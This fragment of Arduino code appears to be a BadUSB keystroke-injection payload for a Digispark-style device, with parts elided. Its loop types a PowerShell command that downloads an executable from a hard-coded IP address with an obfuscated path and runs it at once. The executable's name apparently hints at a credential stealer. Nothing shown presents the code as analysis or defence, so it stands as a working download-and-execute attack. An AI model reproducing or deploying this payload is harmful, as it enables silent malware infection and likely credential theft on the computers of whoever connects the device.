...
void loop() {
  ...
  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/cmpswdgot.exe'; $file = 'cmpswdgot.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  DigiKeyboard.delay(500);
